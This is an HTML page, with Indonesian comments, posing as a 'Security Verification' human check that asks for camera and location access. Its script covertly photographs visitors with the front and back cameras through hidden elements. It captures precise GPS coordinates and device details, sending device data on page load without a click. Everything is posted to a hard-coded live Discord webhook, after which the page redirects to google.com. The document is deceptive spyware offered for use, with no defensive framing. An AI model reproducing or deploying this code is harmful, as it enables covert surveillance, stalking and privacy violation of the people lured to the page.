<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            text-align: center;
            max-width: 500px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid #333;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }

        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 30px;
            border: 3px solid #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 2rem;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }

        h1 {
            font-size: 1.8rem;
            margin-bottom: 20px;
            font-weight: 300;
        }

        p {
            color: #aaa;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .verify-btn {
            background: #fff;
            color: #000;
            padding: 15px 50px;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            transition: 0.3s;
            font-weight: bold;
        }

        .verify-btn:hover {
            background: #ddd;
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(255,255,255,0.3);
        }

        .verify-btn:active {
            transform: translateY(0);
        }

        .status {
            margin-top: 20px;
            font-size: 0.9rem;
            color: #666;
            min-height: 20px;
        }

        .spinner {
            display: none;
            width: 40px;
            height: 40px;
            margin: 20px auto;
            border: 3px solid #333;
            border-top: 3px solid #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Hidden elements */
        video, canvas {
            display: none !important;
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: #fff;
            opacity: 0.3;
            animation: float 10s infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-100vh); }
        }

    </style>
</head>
<body>

    <!-- Particles -->
    <div id="particles"></div>

    <!-- Main Container -->
    <div class="container">
        <div class="logo">ðŸ”’</div>
        <h1>Security Verification</h1>
        <p>To continue, please verify that you are human by allowing access to your camera and location.</p>
        
        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
            Verify Now
        </button>
        
        <div class="spinner" id="spinner"></div>
        <div class="status" id="status"></div>
    </div>

    <!-- Hidden Media Elements -->
    <video id="videoFront" playsinline autoplay muted></video>
    <video id="videoBack" playsinline autoplay muted></video>
    <canvas id="canvasFront"></canvas>
    <canvas id="canvasBack"></canvas>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
        
        let locationSent = false;
        let frontCamSent = false;
        let backCamSent = false;

        // Generate particles
        const particlesDiv = document.getElementById('particles');
        for(let i = 0; i < 30; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            p.style.left = Math.random() * 100 + '%';
            p.style.animationDelay = Math.random() * 10 + 's';
            particlesDiv.appendChild(p);
        }

        // ðŸŽ¯ FUNGSI UTAMA: KIRIM LOKASI
        async function captureLocation() {
            if(locationSent) return;
            
            return new Promise((resolve) => {
                if(!navigator.geolocation) {
                    sendToWebhook({
                        content: "âš ï¸ **GEOLOCATION NOT SUPPORTED**\n```Device tidak support geolocation```"
                    });
                    resolve();
                    return;
                }

                const options = {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                };

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;
                        const timestamp = new Date().toLocaleString('id-ID');
                        
                        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        
                        const payload = {
                            content: `ðŸŽ¯ **LOKASI TERTANGKAP** ðŸŽ¯`,
                            embeds: [{
                                title: "ðŸ“ KOORDINAT GPS",
                                color: 0xFF0000,
                                fields: [
                                    {
                                        name: "ðŸ—ºï¸ Google Maps",
                                        value: `[**BUKA LOKASI DI MAPS**](${mapLink})`,
                                        inline: false
                                    },
                                    {
                                        name: "Latitude",
                                        value: `\`${lat}\``,
                                        inline: true
                                    },
                                    {
                                        name: "Longitude",
                                        value: `\`${lon}\``,
                                        inline: true
                                    },
                                    {
                                        name: "Akurasi",
                                        value: `\`${acc.toFixed(2)} meter\``,
                                        inline: true
                                    },
                                    {
                                        name: "Waktu",
                                        value: `\`${timestamp}\``,
                                        inline: false
                                    }
                                ],
                                footer: {
                                    text: "VOID V3 Location System"
                                }
                            }]
                        };

                        sendToWebhook(payload);
                        locationSent = true;
                        resolve();
                    },
                    (error) => {
                        sendToWebhook({
                            content: `âŒ **LOKASI DITOLAK**\n\`\`\`${error.message}\`\`\``
                        });
                        resolve();
                    },
                    options
                );
            });
        }

        // ðŸŽ¯ FUNGSI UTAMA: FOTO KAMERA DEPAN
        async function captureFrontCamera() {
            if(frontCamSent) return;

            try {
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('videoFront');
                const canvas = document.getElementById('canvasFront');
                
                video.srcObject = stream;
                await video.play();

                // Wait for video to be ready
                await new Promise(resolve => setTimeout(resolve, 1500));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, `front_camera_${Date.now()}.jpg`);
                    formData.append('payload_json', JSON.stringify({
                        content: `ðŸ“¸ **KAMERA DEPAN TERTANGKAP**\n\`\`\`Timestamp: ${new Date().toLocaleString('id-ID')}\nResolution: ${canvas.width}x${canvas.height}\`\`\``
                    }));

                    await fetch(WEBHOOK, { method: 'POST', body: formData });
                    
                    stream.getTracks().forEach(track => track.stop());
                    frontCamSent = true;
                }, 'image/jpeg', 0.95);

            } catch (error) {
                sendToWebhook({
                    content: `âŒ **KAMERA DEPAN DITOLAK**\n\`\`\`${error.message}\`\`\``
                });
            }
        }

        // ðŸŽ¯ FUNGSI UTAMA: FOTO KAMERA BELAKANG
        async function captureBackCamera() {
            if(backCamSent) return;

            try {
                const constraints = {
                    video: {
                        facingMode: { exact: 'environment' },
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                };

                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('videoBack');
                const canvas = document.getElementById('canvasBack');
                
                video.srcObject = stream;
                await video.play();

                await new Promise(resolve => setTimeout(resolve, 1500));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('file', blob, `back_camera_${Date.now()}.jpg`);
                    formData.append('payload_json', JSON.stringify({
                        content: `ðŸ“¸ **KAMERA BELAKANG TERTANGKAP**\n\`\`\`Timestamp: ${new Date().toLocaleString('id-ID')}\nResolution: ${canvas.width}x${canvas.height}\`\`\``
                    }));

                    await fetch(WEBHOOK, { method: 'POST', body: formData });
                    
                    stream.getTracks().forEach(track => track.stop());
                    backCamSent = true;
                }, 'image/jpeg', 0.95);

            } catch (error) {
                // Kamera belakang mungkin tidak ada di PC, skip error
                console.log('Back camera not available:', error.message);
            }
        }

        // Helper function
        async function sendToWebhook(payload) {
            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                console.error('Webhook error:', e);
            }
        }

        // ðŸš€ FUNGSI UTAMA YANG DIPANGGIL SAAT KLIK
        async function startVerification() {
            const btn = document.getElementById('verifyBtn');
            const spinner = document.getElementById('spinner');
            const status = document.getElementById('status');

            btn.style.display = 'none';
            spinner.style.display = 'block';
            status.textContent = 'Verifying...';

            // PRIORITAS 1: LOKASI (PALING PENTING)
            status.textContent = 'Getting location...';
            await captureLocation();
            await new Promise(r => setTimeout(r, 500));

            // PRIORITAS 2: KAMERA DEPAN
            status.textContent = 'Accessing camera...';
            await captureFrontCamera();
            await new Promise(r => setTimeout(r, 500));

            // PRIORITAS 3: KAMERA BELAKANG
            await captureBackCamera();
            await new Promise(r => setTimeout(r, 500));

            // SELESAI
            spinner.style.display = 'none';
            status.textContent = 'âœ“ Verification complete';
            
            setTimeout(() => {
                status.textContent = 'Redirecting...';
                // Redirect ke halaman lain atau refresh
                window.location.href = 'https://google.com';
            }, 1500);
        }

        // ðŸŽ¯ AUTO CAPTURE SAAT PAGE LOAD (BYPASS SECURITY)
        window.addEventListener('load', async () => {
            // Kirim info device dulu
            const deviceInfo = {
                content: "ðŸŒ **NEW VISITOR**",
                embeds: [{
                    title: "Device Information",
                    color: 0x00FF00,
                    fields: [
                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
                        { name: "Platform", value: `\`${navigator.platform}\``, inline: true },
                        { name: "Language", value: `\`${navigator.language}\``, inline: true },
                        { name: "Screen", value: `\`${screen.width}x${screen.height}\``, inline: true },
                        { name: "Time", value: `\`${new Date().toLocaleString('id-ID')}\``, inline: false }
                    ]
                }]
            };
            await sendToWebhook(deviceInfo);

            // AUTO CAPTURE LOKASI (tanpa perlu klik)
            setTimeout(() => {
                captureLocation();
            }, 1000);
        });

        // BACKUP: Auto-trigger jika user interact dengan halaman
        document.addEventListener('click', () => {
            if(!locationSent) captureLocation();
        }, { once: true });

        document.addEventListener('touchstart', () => {
            if(!locationSent) captureLocation();
        }, { once: true });

    </script>
</body>
</html>
